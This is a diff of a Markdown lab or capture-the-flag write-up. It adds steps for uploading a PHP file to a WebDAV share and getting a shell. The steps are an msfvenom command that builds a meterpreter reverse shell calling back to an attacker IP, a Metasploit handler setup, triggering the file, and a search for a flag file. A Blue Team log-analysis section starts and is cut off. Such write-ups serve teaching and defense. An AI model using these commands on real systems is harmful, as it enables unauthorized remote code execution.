@@ -78,14 +78,62 @@ Now that we can login to the WebDav service we can try and upload malicious cont
 
 ![webdav1](https://user-images.githubusercontent.com/90374994/155537659-0e4003d1-0910-4e6e-a7fa-81ee20ae913c.png)
 
-We will try and craft a meterpreter reverse shell using MSFVenom. Since the reverse shell will attempt to connect to the attacker machine, we will need to specify the LHOST as the Kali VM's IP address and the LPORT as 4444:
+We will try and craft a meterpreter reverse shell using MSFVenom. Since the reverse shell will attempt to connect back to our attacker machine, we will need to specify the LHOST as the Kali VM's IP address and the LPORT as 4444:
 
 '''bash
 msfvenom -p php/meterpreter/reverse_tcp -lhost=192.168.1.90 lport=4444 > shell.php
 '''
 
-Now, we can drag and drop the file in the WebDav folder, so we can access it from the web browser:
+Now, we can drag and drop the file in the WebDav folder, so we can access it later from the web browser:
 
 ![webdav2](https://user-images.githubusercontent.com/90374994/155539922-532ce74a-d5c3-498c-8241-f787deb823da.png)
 
+NOTE: before accessing the shell.php from the web browser, we first need to start a listener on our machine. Once the listener is up an running we can simply navigate to the shell.php page and we will achieve remote code execution.
+
+Metasploit Console
+
+To fire up Metasploit we can simply run the following command on our Kali machine:
+
+'''bash
+msfconsole
+'''
+
+Once metasploit opens up, we can select the following exploit:
+
+'''bash
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+'''
+
+Before we run the exploit, we have to set the LHOST. We can see this by running the "options" command. We will notice port 4444 is the default port and is already set, mathcing the php reverse shell we created above. To set the LHOST and start the session we run the following:
+
+'''bash
+set LHOST 192.168.1.90
+run
+'''
+
+Now, we can navigate to http://192.168.1.105/webdav/shell.php to start the reverse shell. If everything was executed correctly, we should get reverse shell connection on our Kali machine:
+
+![metasploit listener](https://user-images.githubusercontent.com/90374994/156852952-9242a9d5-bd04-4ac3-a863-0c95acbd95a9.png)
+
+To find the hidden flag, we can search directly from the meterpreter shell, or we can fire up a shell on the target machine, then run the following:
+
+'''bash
+find / -name flag.txt 2>/dev/null
+'''
+
+![Screen Shot 2022-02-15 at 18 51 59 PM](https://user-images.githubusercontent.com/90374994/156853571-5cc65352-fdca-428f-a479-374bbfbe777a.png)
+
+This will look for any files named "flag.txt", ignoring any access errors it encounters while searching.
+
+Flag found:
+
+![Screen Shot 2022-02-15 at 18 51 08 PM](https://user-images.githubusercontent.com/90374994/156853589-ceec7eb8-0878-4829-8671-88e76f89d631.png)
+
+
+## Blue Team - Log Analysis and Attack Characterization
+
+>During this phase, we will be able to see and analyze logs, generated from the activities above. The logs were generated using FileBeat, MetricBeat and PacketBeat, and we will leverage Kibana, to analyze them.
+
+Once we fire up Kibana from our Windows host machine 
 
